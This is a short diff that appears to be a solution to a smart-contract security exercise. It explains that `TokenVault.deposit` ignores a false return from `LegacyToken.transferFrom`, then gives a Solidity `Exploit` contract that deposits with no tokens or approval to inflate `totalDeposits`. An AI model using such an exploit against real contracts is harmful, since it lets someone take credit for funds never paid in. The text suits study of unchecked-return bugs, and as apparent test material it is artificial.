@@ -1,0 +1,23 @@
+The bug is that `TokenVault.deposit` ignores the boolean returned by `token.transferFrom`. `LegacyToken` returns false on failure instead of reverting, so a caller with no tokens and no approval is still credited in `balances` and `totalDeposits`. That pushes `totalDeposits` above the vault's real token balance and breaks the invariant. A patched vault that checks the return value reverts the deposit, so I wrap the call in try/catch to keep `run()` from reverting there.
+
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity 0.8.28;
+
+interface IVault {
+    function deposit(uint256 amount) external;
+}
+
+contract Exploit {
+    address public vault;
+
+    constructor(address target) payable {
+        vault = target;
+    }
+
+    function run() external {
+        // No tokens, no approval: transferFrom returns false, but the vault still credits us.
+        try IVault(vault).deposit(1 ether) {} catch {}
+    }
+}
+```
